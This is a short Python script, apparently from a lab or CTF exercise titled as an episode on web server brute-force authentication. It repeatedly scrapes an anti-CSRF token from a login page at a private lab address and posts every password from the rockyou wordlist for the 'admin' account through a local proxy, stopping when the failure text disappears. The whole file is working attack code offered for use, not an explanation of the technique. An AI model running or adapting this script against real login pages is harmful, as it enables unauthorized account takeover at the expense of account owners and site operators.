import requests
import sys
#type = "submit" name = "login-1663632923.13">Login</button>
#Web Server Brute Force Authentication: Ep.2

# set export HTTP_PROXY='http://127.0.0.1:8080'
url = "http://10.102.5.79/Login"
expression = "Login"
user_token = ""
proxies = {
   'http': 'http://127.0.0.1:8080',
}

def get_anti_csrf():
    try:
        r = requests.get((url), allow_redirects=False)

    except:
        print ("csrf_token: Failed to connect")
        sys.exit(-1)
    user_token = ((r.content[835:855]).decode().strip('>"'))
    # print((r.content[835:855]).decode().strip('>"'))
    return user_token

    

def brute(username,password,user_token):
	data = {'username':username,'password':password,user_token:"="}
	r = requests.post(url,data=data,proxies=proxies)
	if expression not in r.content.decode() :
		print ("[+] Correct password Found: ",password)
		sys.exit()
	#else:
	#	 print(password)
	




def main():
        words = [w.strip() for w in open("/usr/share/wordlists/rockyou.txt", "rb").readlines()] #parse wordlist
        for payload in words:
                user_token = get_anti_csrf()
                brute("admin",payload,user_token);


if __name__ == '__main__':
	main()
